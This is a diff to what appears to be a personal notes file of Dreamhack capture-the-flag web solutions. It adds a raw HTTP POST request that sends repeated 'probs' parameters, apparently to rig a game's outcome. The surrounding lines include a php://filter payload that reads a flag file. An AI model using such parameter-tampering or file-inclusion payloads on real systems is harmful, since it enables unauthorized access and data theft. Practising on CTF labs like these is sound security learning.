@@ -354,6 +354,17 @@ if __name__ == "__main__":
 ```
 ### session-basic
 - wtf /admin ???
+### Fishing 
+```
+POST /fish HTTP/1.1
+Host: host3.dreamhack.games:13803
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=<COOKIE_HIEN_TAI>
+Content-Length: 185
+Connection: close
+
+probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=0&probs=1
+```
 ### php-1
 ```http://host3.dreamhack.games:10501/?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag```
 ### out of money
